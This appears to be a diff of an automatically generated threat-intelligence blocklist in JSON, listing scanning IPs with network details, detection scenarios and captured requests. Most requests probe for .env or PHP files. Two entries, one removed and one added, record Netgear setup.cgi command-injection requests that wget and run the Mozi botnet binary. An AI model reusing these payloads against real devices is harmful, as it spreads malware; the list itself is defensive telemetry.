@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-05-05T01:00:00Z",
+  "generated_at": "2026-05-05T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
@@ -8,79 +8,6 @@
     "v6": 0
   },
   "items": [
-    {
-      "ip": "34.243.74.146",
-      "family": "v4",
-      "first_seen": "2026-04-28T09:00:00Z",
-      "last_seen": "2026-04-28T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "16509",
-      "asn_name": "AMAZON-02 - Amazon.com",
-      "asn_prefix": "34.240.0.0/13",
-      "tags": [
-        "mwl:cloud=\"aws\""
-      ],
-      "payloads": [
-        "GET /robots.txt",
-        "GET /"
-      ]
-    },
-    {
-      "ip": "179.43.146.226",
-      "family": "v4",
-      "first_seen": "2026-04-28T08:00:00Z",
-      "last_seen": "2026-04-28T08:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "51852",
-      "asn_name": "PLI-AS Private Layer INC",
-      "asn_prefix": "179.43.146.0/24",
-      "payloads": [
-        "GET /.env",
-        "GET /.env.local",
-        "GET /.env.production",
-        "GET /.env.prod",
-        "GET /.env.development",
-        "GET /.env.dev",
-        "GET /.env.staging",
-        "GET /.env.stage",
-        "GET /.env.test",
-        "GET /.env.uat",
-        "GET /.env.qa"
-      ]
-    },
-    {
-      "ip": "103.173.7.167",
-      "family": "v4",
-      "first_seen": "2026-04-28T05:00:00Z",
-      "last_seen": "2026-04-28T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "142647",
-      "asn_name": "NAN-AS-AP Nasstec Airnet Networks Private Limited",
-      "asn_prefix": "103.173.7.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
     {
       "ip": "47.91.125.252",
       "family": "v4",
@@ -821,6 +748,72 @@
         "GET /aaa.php",
         "GET /abcd.php",
         "GET /about.php"
+      ]
+    },
+    {
+      "ip": "52.246.165.173",
+      "family": "v4",
+      "first_seen": "2026-05-05T12:00:00Z",
+      "last_seen": "2026-05-05T12:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /function/function.php",
+        "GET /functions.php",
+        "GET /goods.php",
+        "GET /images/index.php",
+        "GET /index.php",
+        "GET /index/function.php",
+        "GET /install.php",
+        "GET /ioxi-o.php",
+        "GET /k.php",
+        "GET /lock360.php",
+        "GET /meta.php"
+      ]
+    },
+    {
+      "ip": "199.45.155.103",
+      "family": "v4",
+      "first_seen": "2026-05-05T07:00:00Z",
+      "last_seen": "2026-05-05T07:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "206.135.174.31",
+      "family": "v4",
+      "first_seen": "2026-05-05T04:00:00Z",
+      "last_seen": "2026-05-05T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://206.135.174.31:42335/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://206.135.174.31:42335/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
       ]
     }
   ]
